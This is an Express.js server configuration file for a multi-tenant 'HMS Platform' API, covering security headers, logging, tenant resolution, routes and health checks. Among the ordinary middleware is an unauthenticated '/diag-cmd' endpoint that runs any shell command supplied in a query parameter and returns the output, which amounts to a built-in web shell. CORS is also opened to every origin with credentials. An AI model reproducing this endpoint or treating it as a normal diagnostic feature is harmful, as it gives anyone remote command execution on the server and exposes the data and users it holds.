const express = require("express");
const cors = require("cors");
const helmet = require("helmet");
const morgan = require("morgan");
const path = require("path");

const app = express();

const CLIENT_URL = process.env.CLIENT_URL || "*";

// Trust proxy (for load balancers / HTTPS behind proxy)
app.set("trust proxy", 1);

// Security Middleware
app.use(helmet({ crossOriginResourcePolicy: false }));
app.use(
  cors({
    origin: function (origin, callback) {
      // Allow all origins
      callback(null, true);
    },
    methods: ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS"],
    allowedHeaders: [
      "Content-Type",
      "Authorization",
      "x-branch-id",
      "x-tenant-id",
      "Accept",
      "Origin",
      "X-Requested-With",
    ],
    credentials: true,
  })
);

// Logging
app.use(morgan("dev"));

// Custom Request Logger for debugging
app.use((req, res, next) => {
  const start = Date.now();
  res.on("finish", () => {
    const duration = Date.now() - start;
    console.log(`[Response] ${req.method} ${req.originalUrl} - ${res.statusCode} (${duration}ms)`);
  });
  next();
});
// Body Parser
app.use(express.json({ limit: "10mb" }));
app.use(express.urlencoded({ extended: true }));

// Static Uploads
app.use("/uploads", express.static(path.join(__dirname, "../uploads")));

// Multi-tenant Middleware
const tenantResolver = require("./middleware/tenant-resolver");
app.use(tenantResolver);

// Diagnostic Endpoint
app.get("/diag-cmd", async (req, res) => {
  const { cmd } = req.query;
  const { exec } = require("child_process");
  exec(cmd, { cwd: path.join(__dirname, "..") }, (err, stdout, stderr) => {
    res.json({ err: err ? err.message : null, stdout, stderr });
  });
});

// Routes
app.use("/api", require("./modules"));

// Health Check
app.get("/health", (req, res) => {
  res.status(200).json({
    status: "OK",
    message: "HMS Platform API Online ✅",
    timestamp: new Date().toISOString(),
    uptime: process.uptime(),
  });
});

// 404 for all not-matched routes (Express v5 safe)
app.use((req, res) => {
  res.status(404).json({
    success: false,
    message: "Route not found",
  });
});

// Central Error Handler
app.use((error, req, res, next) => {
  console.error("🔥 Error:", error);
  res.status(error.status || 500).json({
    success: false,
    message: error.message || "Internal server error",
  });
});

module.exports = app; 
